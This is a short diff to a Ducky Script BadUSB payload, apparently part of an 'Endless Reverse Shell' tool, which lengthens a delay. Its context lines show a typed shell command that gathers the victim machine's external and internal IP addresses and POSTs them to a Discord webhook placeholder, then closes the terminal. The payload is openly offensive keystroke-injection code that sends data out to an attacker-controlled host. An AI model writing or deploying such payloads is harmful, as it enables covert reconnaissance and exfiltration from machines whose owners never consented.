@@ -19,5 +19,5 @@ ENTER
 STRING external_ip=$(curl -s ifconfig.me); internal_ips=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | sed 's/inet //' | paste -sd "," -); json_payload="{\"content\": \"From Endless Reverse Shell BadUSB:\\nExternal IP: $external_ip\\nInternal IP(s): $(echo $internal_ips | sed 's/,/, /g')\\n----------------------------------------\"}"; curl -X POST -H "Content-Type: application/json" -d "$json_payload" "YOUR_DISCORD_CHANNEL_TOKEN" && unset external_ip internal_ips
 DELAY 2000
 ENTER
-DELAY 500
+DELAY 1500
 GUI q
